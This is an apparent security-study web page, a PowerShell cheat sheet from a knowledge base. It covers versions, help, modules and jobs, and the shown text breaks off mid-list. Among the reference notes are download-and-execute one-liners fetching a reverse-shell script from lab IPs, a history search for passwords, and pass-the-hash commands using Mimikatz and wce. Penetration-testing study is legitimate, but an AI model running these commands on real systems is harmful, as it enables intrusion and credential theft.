



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-4.2.0">
    
    
      
        <title>Powershell - Security Knowledge Base</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/application.750b69bd.css">
      
      
    
    
      <script src="../../assets/javascripts/modernizr.74668098.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../_site/extra.css">
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#powershell" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../.." title="Security Knowledge Base" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Security Knowledge Base
            </span>
            <span class="md-header-nav__topic">
              Powershell
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="../.." title="Security Knowledge Base" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Security Knowledge Base
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../.." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../apt/" title="APT" class="md-nav__link">
      APT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../books/" title="Books" class="md-nav__link">
      Books
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../bug-hunting/" title="Bug hunting" class="md-nav__link">
      Bug hunting
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../career/" title="Career" class="md-nav__link">
      Career
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../code-review/" title="Code review" class="md-nav__link">
      Code review
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../crypto/" title="Crypto" class="md-nav__link">
      Crypto
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../databases-sqlserver/" title="Databases - SqlServer" class="md-nav__link">
      Databases - SqlServer
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../databases/" title="Databases" class="md-nav__link">
      Databases
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../defense/" title="Defense" class="md-nav__link">
      Defense
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../dfir/" title="DFIR" class="md-nav__link">
      DFIR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../embedded-and-iot/" title="Embedded and iot" class="md-nav__link">
      Embedded and iot
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../exploits_and_shellcoding/" title="Exploits and shellcoding" class="md-nav__link">
      Exploits and shellcoding
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../iam-kerberos/" title="IAM - Kerberos" class="md-nav__link">
      IAM - Kerberos
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../iam/" title="IAM" class="md-nav__link">
      IAM
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../languages/" title="Languages" class="md-nav__link">
      Languages
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../linux-issues/" title="Linux issues" class="md-nav__link">
      Linux issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../linux/" title="Linux" class="md-nav__link">
      Linux
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../malware/" title="Malware" class="md-nav__link">
      Malware
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../non-security/" title="Z Non Security" class="md-nav__link">
      Z Non Security
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../operating-systems/" title="Operating systems" class="md-nav__link">
      Operating systems
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../osint/" title="OSINT" class="md-nav__link">
      OSINT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../password-attacks/" title="Password attacks" class="md-nav__link">
      Password attacks
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../ports-and-protocols/" title="Ports and protocols" class="md-nav__link">
      Ports and protocols
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../practice/" title="Practice Environments" class="md-nav__link">
      Practice Environments
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../red-blue-team/" title="Red blue team" class="md-nav__link">
      Red blue team
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../reverse-engineering/" title="Reverse engineering" class="md-nav__link">
      Reverse engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../rf-and-sdr/" title="RF and SDR" class="md-nav__link">
      RF and SDR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../social-engineering/" title="Social engineering" class="md-nav__link">
      Social engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../steganography/" title="Steganography" class="md-nav__link">
      Steganography
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../vulnerable/" title="Vulnerable" class="md-nav__link">
      Vulnerable
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../wifi/" title="WiFi & Wireless" class="md-nav__link">
      WiFi & Wireless
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36" type="checkbox" id="nav-36">
    
    <label class="md-nav__link" for="nav-36">
      Certifications
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-36">
        Certifications
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/cissp/" title="CISSP" class="md-nav__link">
      CISSP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/osce/" title="OSCE" class="md-nav__link">
      OSCE
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oswe/" title="Oswe" class="md-nav__link">
      Oswe
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36-4" type="checkbox" id="nav-36-4">
    
    <label class="md-nav__link" for="nav-36-4">
      Oscp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-36-4">
        Oscp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/0-cheatsheet/" title="Enumeration" class="md-nav__link">
      Enumeration
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/_collections/" title="collections" class="md-nav__link">
       collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/_preparation/" title="Was checking" class="md-nav__link">
      Was checking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/lab-setup/" title="Lab Setup" class="md-nav__link">
      Lab Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/notes/" title="Notes" class="md-nav__link">
      Notes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/practice-vulnhub/" title="Practice" class="md-nav__link">
      Practice
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/setup/" title="Setup" class="md-nav__link">
      Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36-4-9" type="checkbox" id="nav-36-4-9">
    
    <label class="md-nav__link" for="nav-36-4-9">
      Cheatsheet
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-36-4-9">
        Cheatsheet
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/download/" title="Download" class="md-nav__link">
      Download
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/exploits/" title="Exploits" class="md-nav__link">
      Exploits
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/share-files/" title="Share files" class="md-nav__link">
      Share files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/shell/" title="Bash" class="md-nav__link">
      Bash
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/tty/" title="TTY" class="md-nav__link">
      TTY
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36-4-9-10" type="checkbox" id="nav-36-4-9-10">
    
    <label class="md-nav__link" for="nav-36-4-9-10">
      Enumeration
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-36-4-9-10">
        Enumeration
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/enumeration/network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/enumeration/vulnerability/" title="Vulnerability" class="md-nav__link">
      Vulnerability
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/enumeration/windows-local/" title="Windows local" class="md-nav__link">
      Windows local
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-37" type="checkbox" id="nav-37">
    
    <label class="md-nav__link" for="nav-37">
      Cloud
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-37">
        Cloud
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../cloud/aws/" title="Aws" class="md-nav__link">
      Aws
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../cloud/azuer-o360/" title="Azuer o360" class="md-nav__link">
      Azuer o360
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../cloud/general/" title="General" class="md-nav__link">
      General
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-38" type="checkbox" id="nav-38">
    
    <label class="md-nav__link" for="nav-38">
      Devops
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-38">
        Devops
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../devops/CKAD/" title="CKAD" class="md-nav__link">
      CKAD
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../devops/container/" title="Container" class="md-nav__link">
      Container
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../devops/docker/" title="Docker" class="md-nav__link">
      Docker
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../devops/istio/" title="Istio" class="md-nav__link">
      Istio
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../devops/kubernetes/" title="Kubernetes" class="md-nav__link">
      Kubernetes
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-39" type="checkbox" id="nav-39" checked>
    
    <label class="md-nav__link" for="nav-39">
      Windows
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-39">
        Windows
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../active-directory/" title="Active Directory" class="md-nav__link">
      Active Directory
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Powershell
      </label>
    
    <a href="./" title="Powershell" class="md-nav__link md-nav__link--active">
      Powershell
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#collections" title="Collections" class="md-nav__link">
    Collections
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#quick-reference" title="Quick Reference" class="md-nav__link">
    Quick Reference
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#download-files" title="Download Files" class="md-nav__link">
    Download Files
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#execution-policy" title="Execution Policy" class="md-nav__link">
    Execution Policy
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reverse-shell" title="Reverse Shell" class="md-nav__link">
    Reverse Shell
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#remote-script-execution" title="Remote Script execution" class="md-nav__link">
    Remote Script execution
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#powershell-remoting" title="Powershell Remoting" class="md-nav__link">
    Powershell Remoting
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tools" title="Tools" class="md-nav__link">
    Tools
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-directory" title="Active Directory" class="md-nav__link">
    Active Directory
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#net" title=".Net" class="md-nav__link">
    .Net
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#wmi" title="WMI" class="md-nav__link">
    WMI
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#com-objects" title="COM Objects" class="md-nav__link">
    COM Objects
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-registry" title="Windows Registry" class="md-nav__link">
    Windows Registry
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#metasploit" title="Metasploit" class="md-nav__link">
    Metasploit
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#modules" title="Modules" class="md-nav__link">
    Modules
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#resources" title="Resources" class="md-nav__link">
    Resources
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#new-references" title="New References" class="md-nav__link">
    New References
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#development-environment" title="Development Environment" class="md-nav__link">
    Development Environment
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows-issues/" title="Windows issues" class="md-nav__link">
      Windows issues
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows-privilege-escalation/" title="Windows Privilege Escalation" class="md-nav__link">
      Windows Privilege Escalation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#collections" title="Collections" class="md-nav__link">
    Collections
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#quick-reference" title="Quick Reference" class="md-nav__link">
    Quick Reference
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#download-files" title="Download Files" class="md-nav__link">
    Download Files
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#execution-policy" title="Execution Policy" class="md-nav__link">
    Execution Policy
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reverse-shell" title="Reverse Shell" class="md-nav__link">
    Reverse Shell
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#remote-script-execution" title="Remote Script execution" class="md-nav__link">
    Remote Script execution
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#powershell-remoting" title="Powershell Remoting" class="md-nav__link">
    Powershell Remoting
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tools" title="Tools" class="md-nav__link">
    Tools
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-directory" title="Active Directory" class="md-nav__link">
    Active Directory
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#net" title=".Net" class="md-nav__link">
    .Net
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#wmi" title="WMI" class="md-nav__link">
    WMI
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#com-objects" title="COM Objects" class="md-nav__link">
    COM Objects
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-registry" title="Windows Registry" class="md-nav__link">
    Windows Registry
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#metasploit" title="Metasploit" class="md-nav__link">
    Metasploit
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#modules" title="Modules" class="md-nav__link">
    Modules
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#resources" title="Resources" class="md-nav__link">
    Resources
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#new-references" title="New References" class="md-nav__link">
    New References
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#development-environment" title="Development Environment" class="md-nav__link">
    Development Environment
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                <h1 id="powershell">Powershell<a class="headerlink" href="#powershell" title="Permanent link">&para;</a></h1>
<h2 id="collections">Collections<a class="headerlink" href="#collections" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://sid-500.com/downloads/">https://sid-500.com/downloads/</a></li>
<li>Resource: Infosec PowerShell tools, resources, and authors: <a href="https://www.peerlyst.com/posts/resource-infosec-powershell-tools-resources-and-authors?utm_source=twitter&amp;utm_medium=social&amp;utm_content=peerlyst_post&amp;utm_campaign=peerlyst_shared_post">https://www.peerlyst.com/posts/resource-infosec-powershell-tools-resources-and-authors?utm_source=twitter&amp;utm_medium=social&amp;utm_content=peerlyst_post&amp;utm_campaign=peerlyst_shared_post</a></li>
<li>Mayhem scripts: <a href="https://gist.github.com/M3T4L5T3F">https://gist.github.com/M3T4L5T3F</a></li>
<li>Collection of PowerShell network security scripts for system administrators: <a href="https://github.com/thom-s/netsec-ps-scripts">https://github.com/thom-s/netsec-ps-scripts</a></li>
</ul>
<h2 id="quick-reference">Quick Reference<a class="headerlink" href="#quick-reference" title="Permanent link">&para;</a></h2>
<ul>
<li>An A-Z Index of Windows <strong>PowerShell</strong> commands: <a href="https://ss64.com/ps/">https://ss64.com/ps/</a></li>
<li>Windows <strong>PowerShell</strong> command line syntax: <a href="https://ss64.com/ps/syntax.html">https://ss64.com/ps/syntax.html</a></li>
<li><a href="https://pinvoke.net">https://pinvoke.net</a> - Allowing developers to find, edit and add <code>PInvoke</code><a href="https://pinvoke.net/#definePinvoke">*</a> signatures, user-defined types, and any other information related to calling Win32 and other unmanaged APIs from managed code (written in languages such as C# or VB.NET).</li>
<li>Versions<ul>
<li>v1: November 2006 - Windows XP SP2, Windows Server 2003 SP1 and Windows Vista</li>
<li>v2: Windows 7 and Windows Server 2008 R2 (Standalone for: Windows XP SP3, Windows Server 2003 SP2, and Windows Vista SP1)</li>
<li>v3: Windows 8 (Can be installed on: Windows 7 SP1, for Windows Server 2008 SP1, and for Windows Server 2008 R2 SP1) (no XP support)</li>
<li>v4: Windows 8.1 (Can be installed on:  Windows 7 SP1, for Windows Server 2008 SP1, and for Windows Server 2008 R2 SP1)</li>
<li>v5:<ul>
<li>Part of Windows Management Framework (WMF) 5.0.</li>
<li>February 24, 2016.</li>
<li>Features OneGet PowerShell cmdlets to support Chocolatey's repository-based apps.</li>
<li>Ability to manage layer 2 network switches</li>
<li>Windows 10 Anniversary Update</li>
<li>Available for Windows 7, Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, and Windows Server 2012 R2</li>
</ul>
</li>
<li>v6: PowerShell Core on 18 August 2016</li>
<li>Versin information: <code>$PSVersionTable</code>
  <div class="highlight"><pre><span></span><code>Get-Host | Select-Object Version
$PSVersionTable
</code></pre></div></li>
</ul>
</li>
<li>Help System<ul>
<li><code>Get-Help Get-Process</code></li>
<li><code>help Get-Process</code></li>
<li><code>Update-Help</code></li>
<li><code>Get-Help remoting</code></li>
<li><code>Get-Help about_*remot*</code></li>
</ul>
</li>
<li>Basic Execution<ul>
<li>64 bit
  <div class="highlight"><pre><span></span><code><span class="nv">%SystemRoot%</span>\sysnative\WindowsPowerShell\v1.0\powershell.exe <span class="s2">&quot;IEX(New-Object Net.Webclient).DownloadString(&#39;http://10.10.14.17/Invoke-PowerShellTcp.ps1&#39;)&quot;</span>
</code></pre></div></li>
<li>32 bit
  <div class="highlight"><pre><span></span><code><span class="k">START</span> /MIN /LOW CMD /C <span class="nv">%SystemRoot%</span>\system32\WindowsPowerShell\v1.0\powershell.exe <span class="s2">&quot;IEX(New-Object Net.Webclient).DownloadString(&#39;http://10.11.0.50/shells/Invoke-PowerShellTcp.ps1&#39;)&quot;</span>
</code></pre></div></li>
<li>Using command line: <code>echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.17:8000/Sherlock.ps1') | PowerShell -Noprofile -</code></li>
</ul>
</li>
<li>Basic Constructs<ul>
<li>Cmdlets</li>
<li>Function</li>
</ul>
</li>
<li>List all Cmdlets: <ul>
<li><code>Get-Command -CommandTyle Cmdlet</code></li>
<li><code>Get-Command -Name *process*</code></li>
</ul>
</li>
<li>Aliases: <code>Get-Alias -Name ps</code> <code>Get-Alias -Definition Get-Process</code></li>
<li>Check Environment<ul>
<li><code>C:\WIndows\Syswow64\Windowspowershell\v1.0\powershell.exe</code><ul>
<li><code>PSModulePath</code></li>
</ul>
</li>
<li>Version info: <code>powershell -v 2.0 -c $psversiontable</code></li>
<li>Language mode: <code>$host.runspace.languagemode</code></li>
<li>Check if AppLocker is enabled: <code>Get-AppLockerPolicy -Local</code></li>
<li>Powershell Version: <code>(Get-Host).Version</code></li>
<li>64bit version: <code>%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe</code></li>
</ul>
</li>
<li>Modules<ul>
<li><code>. .\Example.ps1</code></li>
<li><code>Import-Module &lt;path_to_module&gt; -verbose</code></li>
<li>List all available modules: <code>Get-Module -ListAvailable -All</code><ul>
<li>List all modules available in: <code>$env:PSModulePath</code></li>
</ul>
</li>
<li>All functions exposed by a module: <code>Get-Command -Module &lt;module_name&gt;</code></li>
</ul>
</li>
<li>Command History (PSReadline)<ul>
<li><code>cat (Get-PSReadlineOption).HistorySavePath | sls password</code></li>
<li>By default, the path is: <code>profile:\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></li>
</ul>
</li>
<li>System Information<ul>
<li><code>Get-HotFix</code></li>
</ul>
</li>
<li>Jobs<ul>
<li>Run job on a remote machine using <code>PSSession</code> or by using <code>-AsJob</code> with <code>-ComputerName</code>. With <code>-AsJob</code> it's possible to see remote jobs using <code>Get-Job</code>.
  <div class="highlight"><pre><span></span><code>Start-Job -ScriptBlock {whoami}
Start-Job -FilePath &lt;path&gt;

Get-Job | Receive-Job
Get-Job -id &lt;id&gt; | Receive-Job
Remove-Job
</code></pre></div>
  <div class="highlight"><pre><span></span><code>Get-Command -ParameterName AsJob
</code></pre></div></li>
</ul>
</li>
<li>Directory search:<code>Get-HttpStatus</code></li>
<li>Pass the Hash with Powershell<ul>
<li><a href="http://www.pwnag3.com/2014/05/what-did-microsoft-just-break-with.html">http://www.pwnag3.com/2014/05/what-did-microsoft-just-break-with.html</a>
  <div class="highlight"><pre><span></span><code>.\wce.exe –s &lt;Administrator:.:hashes&gt; -c PowerShell.exe

Invoke-Mimikatz -Command &quot;&#39;&quot;sekurlsa::pth /user:Administrator /domain:. /ntlm:&lt;ntlmhash&gt; /run:powershell.exe&#39;&quot;&quot;
</code></pre></div></li>
</ul>
</li>
<li>Persistence<ul>
<li>WMI permanent event consumers</li>
<li>Windows registry</li>
<li>Scheduled tasks</li>
</ul>
</li>
<li>Restricting Powershell<ul>
